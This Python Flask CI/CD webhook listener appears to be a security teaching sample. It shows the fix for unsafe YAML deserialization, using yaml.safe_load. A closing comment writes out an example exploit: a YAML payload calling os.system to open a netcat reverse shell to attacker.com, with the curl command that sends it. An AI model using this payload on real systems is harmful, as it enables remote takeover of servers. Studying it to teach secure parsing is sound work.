import os
import sys
import uuid
import sqlite3
import logging
import yaml
from datetime import datetime
from flask import Flask, request, jsonify

# Configure logging for the CI/CD Webhook Listener
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - WebhookServer - %(levelname)s - %(message)s'
)
logger = logging.getLogger("CI_Listener")

app = Flask(__name__)
DB_FILE = "webhook_jobs.db"

def init_webhook_db():
    """Initializes the SQLite database for tracking CI/CD webhook events."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE webhook_events (
            job_id TEXT PRIMARY KEY,
            received_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            source_ip TEXT NOT NULL,
            repository TEXT,
            commit_hash TEXT,
            status TEXT NOT NULL
        )
    ''')
    
    # Pre-populate with historical mock records
    mock_history = [
        ('job_f8a9b0', datetime.now().isoformat(), '192.168.1.100', 'frontend-ui', 'a1b2c3d', 'PROCESSED'),
        ('job_e7d6c5', datetime.now().isoformat(), '192.168.1.101', 'backend-api', 'f9e8d7c', 'FAILED')
    ]
    cursor.executemany('''
        INSERT INTO webhook_events (job_id, received_at, source_ip, repository, commit_hash, status)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("Webhook tracking database initialized.")

def log_webhook_event(job_id: str, source_ip: str, repo: str, commit: str, status: str):
    """Records the outcome of a webhook processing attempt."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO webhook_events (job_id, source_ip, repository, commit_hash, status) VALUES (?, ?, ?, ?, ?)",
            (job_id, source_ip, repo, commit, status)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error logging job {job_id}: {e}")

def parse_webhook_payload(yaml_data: str, job_id: str) -> dict:
    """
    SECURE: Uses yaml.safe_load instead of unsafe_load to prevent Unsafe Deserialization (CWE-502).
    """
    logger.info(f"[{job_id}] Initiating secure YAML webhook payload parsing.")
    
    try:
        # Secure: We replace yaml.unsafe_load() with yaml.safe_load().
        # yaml.safe_load() strictly limits parsing to standard YAML data types 
        # (like lists, dictionaries, strings, and numbers). It completely blocks 
        # the instantiation of arbitrary Python objects or execution of system commands, 
        # effectively mitigating the YAML deserialization vulnerability.
        parsed_data = yaml.safe_load(yaml_data)
        
        if isinstance(parsed_data, dict):
            logger.debug(f"[{job_id}] Successfully parsed webhook dictionary safely.")
            return parsed_data
        else:
            logger.warning(f"[{job_id}] Parsed payload is not a valid YAML dictionary.")
            return {}
            
    except yaml.YAMLError as e:
        logger.error(f"[{job_id}] Failed to parse YAML payload safely: {e}")
        return {}
    except Exception as e:
        logger.error(f"[{job_id}] Unexpected error during YAML parsing: {e}")
        return {}

@app.route('/api/v1/health', methods=['GET'])
def health_check():
    """Simple health check endpoint."""
    return jsonify({"status": "CI/CD Webhook Listener is active."})

@app.route('/webhook/github', methods=['POST'])
def handle_github_webhook():
    """Endpoint to receive CI/CD pipeline triggers via YAML payload."""
    source_ip = request.remote_addr
    job_id = f"job_{uuid.uuid4().hex[:8]}"
    
    if not request.data:
        logger.warning(f"[{job_id}] Webhook failed: No payload provided by {source_ip}.")
        log_webhook_event(job_id, source_ip, "UNKNOWN", "UNKNOWN", "FAILED_EMPTY")
        return jsonify({"error": "Missing YAML payload in request body"}), 400
        
    try:
        # Read the raw POST body data (expected to be YAML format)
        raw_payload = request.data.decode('utf-8')
        logger.info(f"[{job_id}] Received webhook payload from {source_ip} ({len(raw_payload)} bytes)")
        
        # Pass the untrusted raw string directly to the vulnerable function
        webhook_data = parse_webhook_payload(raw_payload, job_id)
        
        repo_name = webhook_data.get('repository', 'UNKNOWN')
        commit_hash = webhook_data.get('commit', 'UNKNOWN')
        
        if repo_name != 'UNKNOWN' and commit_hash != 'UNKNOWN':
            log_webhook_event(job_id, source_ip, repo_name, commit_hash, "PROCESSED")
            return jsonify({
                "message": "Webhook processed successfully", 
                "job_id": job_id,
                "repository": repo_name
            }), 200
        else:
            log_webhook_event(job_id, source_ip, repo_name, commit_hash, "FAILED_INVALID_SCHEMA")
            return jsonify({"error": "Payload missing 'repository' or 'commit' fields"}), 422
            
    except UnicodeDecodeError:
        logger.error(f"[{job_id}] Failed to decode payload as UTF-8")
        log_webhook_event(job_id, source_ip, "UNKNOWN", "UNKNOWN", "FAILED_ENCODING")
        return jsonify({"error": "Invalid character encoding"}), 400
    except Exception as e:
        logger.error(f"[{job_id}] Internal server error handling webhook: {e}")
        log_webhook_event(job_id, source_ip, "UNKNOWN", "UNKNOWN", "ERROR")
        return jsonify({"error": "Internal server error"}), 500

if __name__ == "__main__":
    init_webhook_db()
    
    logger.info("Starting Flask CI/CD Webhook Listener on http://0.0.0.0:5000")
    
    # Example Malicious Trigger:
    # 1. Attacker crafts a malicious YAML payload:
    #    payload = '''
    #    repository: "frontend-ui"
    #    commit: "latest"
    #    exploit: !!python/object/apply:os.system
    #      args: ["nc -e /bin/sh attacker.com 4444"]
    #    '''
    #
    # 2. Attacker sends the payload to the API via POST:
    #    curl -X POST http://127.0.0.1:5000/webhook/github \
    #         -H "Content-Type: application/x-yaml" \
    #         -d "$payload"
    
    app.run(host="0.0.0.0", port=5000, debug=False)
